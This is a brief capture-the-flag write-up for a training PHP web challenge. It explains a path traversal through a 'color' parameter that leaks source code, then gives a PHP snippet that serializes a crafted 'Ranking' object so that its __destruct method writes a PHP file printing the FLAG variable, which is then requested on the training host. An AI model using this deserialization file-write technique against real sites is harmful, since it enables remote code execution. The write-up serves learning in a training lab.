this challenged was mostly explained in the year 22/23

Basically there are two main vulnerabilities in this code:
1) there is a blue button on index that loads a css file by a get request.
    If you use color='../filename' you get the source code in the style 
    of the rendered page. 
2) After having downloaded everything I saw in innerGame.php the ranking class
    having the __destruct function who is writing a file in the memory

So I crafted this code in php

<?php
class Ranking{
  public $ranking ="<?php echo getenv('FLAG'); ?>";
  public $changed = true;
  public $path = "./hello2.php";
}

$r = new Ranking(); 
echo serialize($r)
?>

the result is stored in replay file. Once loaded in the memory I can call 
http://1024.training.jinblack.it/games/hello2.php and the flag will be printed
